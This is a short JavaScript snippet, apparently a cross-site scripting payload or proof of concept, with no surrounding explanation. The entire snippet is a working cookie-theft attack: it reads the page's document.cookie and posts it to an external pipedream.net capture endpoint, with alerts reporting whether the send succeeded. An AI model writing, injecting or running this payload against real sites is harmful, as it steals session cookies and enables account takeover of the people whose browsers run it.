	alert("hello");
	cookieValue = document.cookie;

            const headers = new Headers();
            headers.append("Content-Type", "application/json");

            const body = {
                "cookie": cookieValue
            };

            const options = {
                method: "POST",
                headers,
                mode: "cors",
                body: JSON.stringify(body)
            };

            fetch("https://eobr7f81g93j2x7.m.pipedream.net", options)
            .then(response => {
                if (response.ok) {
                    alert('Cookie sent successfully');
                } else {
                    alert('Failed to send cookie');
                }
            })
            .catch(error => {
                alert('Error sending cookie:', error);
            });
 
